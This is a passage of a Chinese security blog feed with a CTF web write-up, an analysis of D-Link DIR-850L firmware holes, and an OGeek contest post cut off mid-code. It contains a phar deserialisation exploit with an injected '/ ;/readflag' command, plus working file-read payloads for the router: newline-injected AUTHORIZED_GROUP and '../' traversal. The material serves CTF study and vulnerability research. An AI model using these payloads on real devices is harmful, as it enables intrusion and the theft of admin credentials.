Fileupload($file);</span></span><br><span class="line"><span class="php">$fileupload-&gt;deal();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"存储的图片:"</span>.<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">$ls = <span class="keyword">new</span> Listfile(<span class="string">'./uploads/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $ls-&gt;listdir().<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>各个类的实现代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $option;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip,$user,$password,$option)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user=$user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip=$ip;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;option=$option;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">testquery</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $m = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;ip,<span class="keyword">$this</span>-&gt;user,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">if</span>($m-&gt;connect_error)&#123;</span><br><span class="line">            <span class="keyword">die</span>($m-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $m-&gt;options(<span class="keyword">$this</span>-&gt;option,<span class="number">1</span>);</span><br><span class="line">        $result=$m-&gt;query(<span class="string">'select 1;'</span>);</span><br><span class="line">        <span class="keyword">if</span>($result-&gt;num_rows&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'测试完毕，数据库服务器处于开启状态'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'测试完毕,数据库服务器未开启'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uploadfile;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uploadfile=$filename;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">xs</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'请求结束'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $extensionarr=<span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>);</span><br><span class="line">        $extension = pathinfo(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'name'</span>], PATHINFO_EXTENSION);</span><br><span class="line">        $type = <span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'type'</span>];</span><br><span class="line">        <span class="comment">//echo "type: ".$type;</span></span><br><span class="line">        $filetypearr=<span class="keyword">array</span>(<span class="string">"image/jpeg"</span>,<span class="string">"image/png"</span>,<span class="string">"image/gif"</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$extensionarr)&amp;in_array($type,$filetypearr)&amp;<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"size"</span>]&lt;<span class="number">204800</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"错误：: "</span> .<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_dir(<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>))&#123;</span><br><span class="line">                    mkdir(<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $upload_dir=<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</span><br><span class="line">                move_uploaded_file(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"tmp_name"</span>],$upload_dir.md5(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'name'</span>]).<span class="string">"."</span>.$extension);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"上传成功"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"不被允许的文件类型"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);  <span class="comment">#👈这个地方明显的反序列化，所以主要就是构造的问题</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以整体逻辑也很清晰，利用文件上传上传phar文件，通过<a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">Rogue-MySql-Server</a>访问phar文件触发反序列化</p><p>首先构造一下phar</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file=<span class="string">"/ ;/readflag"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@unlink(<span class="string">"ccc.phar"</span>);</span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">"ccc.phar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span></span><br><span class="line"><span class="php">$a=<span class="keyword">new</span> Listfile();</span></span><br><span class="line"><span class="php">$b=<span class="keyword">new</span> Fileupload($a);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($b);</span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($b);</span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>输出ccc.phar后进行上传</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309180801242.png" alt></p><p>在vps上编辑Rogue-MySql-Server脚本启动就行</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309180850045.png" alt></p><p>还有一个问题就是testsql中的option设成什么？option用于设置MYSQLI_OPT_LOCAL_INFILE，本地查看一下</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309181317575.png" alt></p><p>所以option设置为8就行了，利用testsql访问服务器上起的rogue_mysql_server服务就会直接触发/readflag</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309181536562.png" alt></p><h3 id="0x08-nothardweb"><a href="#0x08-nothardweb" class="headerlink" title="0x08 nothardweb"></a>0x08 nothardweb</h3><p>这个没去看，具体思路是跑seed（这里有一个非预期），可以直接构造cookie，打内网，之后内网还有一个tomcat，复现后写</p><h3 id="0x09-easy-trick-gzmtu"><a href="#0x09-easy-trick-gzmtu" class="headerlink" title="0x09 easy_trick_gzmtu"></a>0x09 easy_trick_gzmtu</h3><p>SQL注入后，复现写</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;很长一段时间没有接触了，都沉迷于课程学习不能自拔（被迫的），果然2020年对题目都失去了感觉，不仅如此，刚打开就想x了……，简单先整理一下做出来的题。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x00-Webtmp&quot;&gt;&lt;a href=&quot;#0x00-Webtmp&quot; class=&quot;headerlink&quot; title=&quot;0x00 Webtmp&quot;&gt;&lt;/a&gt;0x00 Webtmp&lt;/h3&gt;
    
    </summary>
    
    
      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>小白的跨方向IoT DIR850L-A1固件漏洞分析</title>
    <link href="https://cyc1e183.github.io/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyc1e183.github.io/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-03-04T11:59:46.000Z</published>
    <updated>2020-03-04T12:01:35.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h1><p>我是到官网的查询下载的，下载地址：<a href="http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L" target="_blank" rel="noopener">http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L</a><br>也可以直接到ftp服务器上下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP" target="_blank" rel="noopener">ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP</a></p><h1 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h1><p>下载的bin文件利用binwalk进行解压</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me <span class="module-access"><span class="module"><span class="identifier">DIR850L_FW113WWb01_f4if</span>.</span></span>bin</span><br></pre></td></tr></table></figure><p>起文件系统的路径为</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="module-access"><span class="module"><span class="identifier">_DIR850L_FW113WWb01_f4if</span>.</span></span>bin.extracted/squashfs-root</span><br></pre></td></tr></table></figure><p>其中web服务放置于htdocs中，我是进行白盒跟着早前的分析文章进行分析，所以将文件夹打包到本地查看代码。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞分析得前提是要会用ida逆向cgi文件来分析web服务调用逻辑。</p><h3 id="0x01-getcfg-php-任意文件读取"><a href="#0x01-getcfg-php-任意文件读取" class="headerlink" title="0x01 getcfg.php 任意文件读取"></a>0x01 getcfg.php 任意文件读取</h3><p>查看\htdocs\web\getcfg.php的源代码👇</p><p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-982fa7a4d7c2e2c5.png" alt></p><p>这个代码逻辑特别简单了，就是SERVICES参数的值传入变量$GETCFG_SVC中，最后拼接到了变量$file中，利用dophp函数给load出来了，也就是说我们可以控制SERVICES的值，即可以控制file指向的文件，虽然说后面拼接了’.xml.php’，不过虽然事小白的我也知道后缀为’.xml.php’有管理员信息的文件~，不过显然这是一个else条件触发的代码，所以看一下前面的if条件👇</p><p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-cd9a505e1f416663.png" alt></p><p>这里需要判断一个AUTHORIZED_GROUP的值和CACHE，CACHE的简单，不输入或者不为True就好了，AUTHORIZED_GROUP这个就要涉及到分析cgi的事了，其中cgibin文件是负责解析php的，参考<a href="https://www.anquanke.com/post/id/175625来进行分析（毕竟一个IoT小白得先跟着一步一步来）👇" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175625来进行分析（毕竟一个IoT小白得先跟着一步一步来）👇</a></p><p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-0fdf3218d2af148e.png" alt></p><p>通过sess_validate来解析验证AUTHORIZED_GROUP变量值，并通过sprintf处理作为全局变量，之后调用了sobj_add_string和sobj_add_char，由于在调用 sobj_add_char 函数时，会用换行符来分隔参数，也就是说构造 %0aAUTHORIZED_GROUP=1 即AUTHORIZED_GROUP会当作参数处理，处理后并作为全局变量，所以也就可以用来绕过is_power_user函数的身份检验，所以payload可以为👇</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SERVICES</span>=DEVICE.ACCOUNT&amp;[随便啥都行]=%<span class="attribute">0aAUTHORIZED_GROUP</span>=1</span><br></pre></td></tr></table></figure><p>就可以触发相关逻辑代码，实现任意文件读取。</p><h3 id="0x02-fatlady-php-任意文件读取"><a href="#0x02-fatlady-php-任意文件读取" class="headerlink" title="0x02 fatlady.php 任意文件读取"></a>0x02 fatlady.php 任意文件读取</h3><p>由于用户向hedwig.cgi发送xml数据时，hedwig.xml会调用fatlady.php 文件进行处理，查看fatlady.php文件代码，路径\htdocs\webinc\fatlady.php👇</p><p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-219b62810a831de4.png" alt></p><p>同理，service直接拼接到了变量$target上，之后调用dophp进行load，导致直接读取任意以php为后缀的文件，同上，我们可以读取DEVICE.ACCOUNT.xml.php文件，即利用service进行跨目录读取，例如构造service的值为../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml，这里POST 数据包中 xml 数据带上 postxml标签即可，如👇</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;?xml version "<span class="number">1.0</span>" encoding "utf<span class="number">-8</span>"&gt;</span><span class="params">&lt;postxml&gt;</span><span class="params">&lt;module&gt;</span><span class="params">&lt;service&gt;</span>../../..<span class="meta-keyword">/htdocs/</span>webinc<span class="meta-keyword">/getcfg/</span>DEVICE.ACCOUNT.xml<span class="params">&lt;/service&gt;</span><span class="params">&lt;/module&gt;</span><span class="params">&lt;/postxml&gt;</span></span><br></pre></td></tr></table></figure><p>发送xml数据，将header中的Content-Type设置为text/xml即可。</p><p><strong>未完待续。。。。。。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;固件下载&quot;&gt;&lt;a href=&quot;#固件下载&quot; class=&quot;headerlink&quot; title=&quot;固件下载&quot;&gt;&lt;/a&gt;固件下载&lt;/h1&gt;&lt;p&gt;我是到官网的查询下载的，下载地址：&lt;a href=&quot;http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L&lt;/a&gt;&lt;br&gt;也可以直接到ftp服务器上下载：&lt;a href=&quot;ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的漏洞分析之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="代码审计" scheme="https://cyc1e183.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="IoT" scheme="https://cyc1e183.github.io/tags/IoT/"/>
    
  </entry>
  
  <entry>
    <title>OGeek决赛两道Web总结分析</title>
    <link href="https://cyc1e183.github.io/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/"/>
    <id>https://cyc1e183.github.io/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/</id>
    <published>2019-09-26T04:03:28.000Z</published>
    <updated>2020-03-05T10:59:24.949Z</updated>
    
    <content type="html"><![CDATA[<p><strong>很久没有打攻防赛了，致力于写出Perfect文件监控脚本我在这次比赛翻车了，服务器没有pytyon2环境，所以回来更新成了python3了，旅游队伍意外拿了个季军，总的来说赞一下这次比赛，体验还是不错的，小小总结一下决赛的Web（场上弟弟，赛后分析，不会java，漏洞也肯定没找全，欢迎师傅贴个文章学习一波）python和php题目源码下载地址：<a href="https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ</a> 提取码: 1jpa</strong></p><h2 id="0x01-mOtrix"><a href="#0x01-mOtrix" class="headerlink" title="0x01 mOtrix"></a>0x01 mOtrix</h2><p>一道python题，这里贴下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template,send_from_directory, make_response</span><br><span class="line"><span class="keyword">from</span> Archives <span class="keyword">import</span> Archives</span><br><span class="line"><span class="keyword">import</span> pickle,base64,os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_str</span><span class="params">(type,str)</span>:</span></span><br><span class="line">    retstr = <span class="string">"%s'%s'"</span>%(type,str)</span><br><span class="line">    print(retstr)</span><br><span class="line">    <span class="keyword">return</span> eval(retstr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    check_format = [<span class="string">'class'</span>,<span class="string">'+'</span>,<span class="string">'getitem'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'subclasses'</span>,<span class="string">'builtins'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>]</span><br><span class="line">    <span class="keyword">return</span> choice(check_format)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> Archives</span><br><span class="line">    resp = make_response(render_template(<span class="string">'index.html'</span>, Archives = Archives))</span><br><span class="line">    cookies = 